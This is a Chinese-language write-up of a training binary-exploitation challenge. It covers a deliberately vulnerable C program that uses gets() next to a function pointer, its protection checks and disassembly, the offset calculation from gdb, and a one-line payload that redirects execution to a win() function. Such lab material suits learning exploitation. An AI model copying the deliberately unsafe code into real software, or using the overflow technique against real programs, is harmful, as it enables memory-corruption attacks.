---
title: pwn-sniper-03
updated: 2023-06-26 01:31:25Z
created: 2023-05-17 06:22:45Z
---

**漏洞程序源码如下：**

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
        printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
        volatile int (*fp)();
        char buffer[64];

        fp = 0;

        gets(buffer);

        if(fp) {
                printf("calling function pointer, jumping to 0x%08x\n", fp);
                fp();
        }
}
```

**编译选项如下：**

```makefile
a.out:hello.c
        gcc -g -fno-stack-protector -z execstack hello.c
clean:
        rm ./a.out
```

**checksec**

```
└─$ checksec --file=./a.out
[*] '/home/kali/PwnMe/challenges/train/sniper/3/a.out'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

**objdump**

```
└─$ objdump -t -j .text a.out

a.out:     file format elf64-x86-64

SYMBOL TABLE:
00000000004004d0 l    d  .text  0000000000000000              .text
0000000000400500 l     F .text  0000000000000000              deregister_tm_clones
0000000000400530 l     F .text  0000000000000000              register_tm_clones
0000000000400570 l     F .text  0000000000000000              __do_global_dtors_aux
0000000000400590 l     F .text  0000000000000000              frame_dummy
0000000000400690 g     F .text  0000000000000002              __libc_csu_fini
0000000000400620 g     F .text  0000000000000065              __libc_csu_init
00000000004005bd g     F .text  0000000000000010              win
00000000004004d0 g     F .text  0000000000000000              _start
00000000004005cd g     F .text  000000000000004d              main
```

**查看反编译代码**

```c
uint64_t dbg_main (char ** argv, int32_t argc) {
    char ** var_60h;
    int32_t var_54h;
    char [64] buffer;
    int32_t fp;
    rsi = argv;
    rdi = argc;
    /* int main(int argc,char ** argv); */
    var_54h = edi;
    var_60h = rsi;
    fp = 0;
    rax = &buffer;
    rdi = rax;
    gets ();
    if (fp != 0) {
        rax = fp;
        rsi = fp;
        eax = 0;
        printf ("calling function pointer, jumping to 0x%08x\n");
        rdx = fp;
        eax = 0;
        void (*rdx)() ();
    }
    return rax;
}
```

```c
void win(void)
{
    // void win();
    puts("code flow successfully changed");
    return;
}
```

**本题目较为简单，没有开启什么保护，程序功能就是使用gets函数获取输入数据，判断fp变量是否为真，为真则执行print函数，我们可以通过溢出buffer变量到fp变量处，并覆盖EIP为win函数地址，从而执行win函数功能**

**gdb调试**

**<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/1f5f13de80cd8f8bb704edd452af0728.png" alt="1f5f13de80cd8f8bb704edd452af0728.png" width="641" height="467">**

**buffer变量的偏移地址为bp-0x50h**

**<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/a2f071794bc60995a6c2a7054afd4be7.png" alt="a2f071794bc60995a6c2a7054afd4be7.png" width="626" height="414">**

**fp变量的偏移地址为bp-0x8h**

**从而可以得出，buffer到fp 之间的距离为0x50h - 0x8h = 80-8 = 72**

**查找win函数的地址**

**<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/700f0763d6207bf66c783e32f35f4085.png" alt="700f0763d6207bf66c783e32f35f4085.png" width="589" height="84">**

**可以看到，win函数的地址为0x004005bd，exp如下：**

```python
python2 -c "print 'A' * 72 + '\xbd\x05\x40\x00'" | ./a.out  //win函数地址使用小端序
```

<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/a250c49c943f6109088ae68948963def.png" alt="a250c49c943f6109088ae68948963def.png" width="740" height="117">